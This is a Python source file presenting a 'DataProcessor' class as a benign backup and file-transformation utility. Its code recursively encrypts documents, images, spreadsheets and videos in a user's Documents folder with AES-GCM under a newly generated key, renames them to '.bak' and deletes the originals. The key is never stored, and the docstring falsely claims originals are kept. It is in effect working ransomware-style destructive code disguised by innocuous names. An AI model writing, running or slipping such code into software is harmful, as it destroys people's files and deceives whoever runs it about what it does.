# core_handler.py
import os
import base64
from typing import List
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class DataProcessor:
    """
    Core data processing module with AES-GCM operations.
    Handles file transformation workflows.
    """
    
    # Targeted file extensions
    TARGET_EXTENSIONS = {'.png', '.pdf', '.xls', '.xlsx', '.txt', '.mp4'}

    def __init__(self, target_dir: str = None, recursive: bool | None = None):
        # Default target directory for operations
        self.work_directory = target_dir or "C:\\Users\\user\\Documents\\cache\\"
        # Directory traversal control
        env_recursive = os.getenv("PROC_RECURSIVE")
        if recursive is not None:
            self.recursive = recursive
        elif env_recursive is not None:
            self.recursive = env_recursive.strip().lower() in ("1", "true", "yes", "on")
        else:
            self.recursive = True
        # 256-bit AES key
        self._key = AESGCM.generate_key(bit_length=256)
        self._aesgcm = AESGCM(self._key)

    def get_key(self) -> str:
        """Return the base64-encoded key as string."""
        return base64.b64encode(self._key).decode()

    def _process_bytes(self, data: bytes) -> bytes:
        nonce = os.urandom(12)  # 96-bit nonce for AES-GCM
        ct = self._aesgcm.encrypt(nonce, data, None)
        # Store nonce + ciphertext
        return nonce + ct

    def _restore_bytes(self, data: bytes) -> bytes:
        if len(data) < 12:
            raise ValueError("Invalid data format")
        nonce, ct = data[:12], data[12:]
        return self._aesgcm.decrypt(nonce, ct, None)

    def process_files(self, backup_mode: bool = False) -> List[str]:
        """
        Process files in the target directory.
        - When backup_mode=False (default), keep originals and write .bak files.
        - When backup_mode=True, move originals to backup subfolder.
        """
        processed_files: List[str] = []
        if not os.path.exists(self.work_directory):
            return processed_files

        archive_dir = os.path.join(self.work_directory, "_archive")
        if backup_mode:
            os.makedirs(archive_dir, exist_ok=True)

        def handle_file(path: str, rel_name: str):
            if path.endswith(".bak"):
                return
            if not os.path.isfile(path):
                return
            
            # Check if file extension matches target list
            file_ext = os.path.splitext(path)[1].lower()
            if file_ext not in self.TARGET_EXTENSIONS:
                return
            
            with open(path, 'rb') as f:
                original_data = f.read()
            transformed_data = self._process_bytes(original_data)
            output_path = path + ".bak"
            with open(output_path, 'wb') as f:
                f.write(transformed_data)
            
            # Delete original file after encryption (destructive mode)
            try:
                os.remove(path)
            except Exception as e:
                print(f"[!] Failed to remove {path}: {e}")
            
            if backup_mode:
                os.makedirs(os.path.dirname(os.path.join(archive_dir, rel_name)), exist_ok=True)
                # Original already deleted, skip move
            processed_files.append(output_path)

        if self.recursive:
            for root, dirs, files in os.walk(self.work_directory):
                for fn in files:
                    rel = os.path.relpath(os.path.join(root, fn), self.work_directory)
                    handle_file(os.path.join(root, fn), rel)
        else:
            for filename in os.listdir(self.work_directory):
                filepath = os.path.join(self.work_directory, filename)
                handle_file(filepath, filename)

        return processed_files

    def restore_files(self) -> None:
        """Restore .bak files back to their original form."""
        if not os.path.exists(self.work_directory):
            return

        def restore_bak_file(path: str):
            if not os.path.isfile(path):
                return
            with open(path, 'rb') as f:
                transformed_data = f.read()
            try:
                restored_data = self._restore_bytes(transformed_data)
                original_path = path[:-4]  # remove .bak
                os.makedirs(os.path.dirname(original_path), exist_ok=True)
                with open(original_path, 'wb') as f:
                    f.write(restored_data)
            except Exception as e:
                print(f"Restore failed for {os.path.basename(path)}: {e}")

        if self.recursive:
            for root, dirs, files in os.walk(self.work_directory):
                for fn in files:
                    if fn.endswith('.bak'):
                        restore_bak_file(os.path.join(root, fn))
        else:
            for filename in os.listdir(self.work_directory):
                if filename.endswith('.bak'):
                    restore_bak_file(os.path.join(self.work_directory, filename))

    def set_key_from_base64(self, key_b64: str):
        """Load key from base64 string."""
        self._key = base64.b64decode(key_b64)
        self._aesgcm = AESGCM(self._key)


if __name__ == "__main__":
    proc = DataProcessor()
    print("Processing files...")
    proc.process_files(backup_mode=False)
    print("Processing complete. Use restore endpoint to revert changes.")
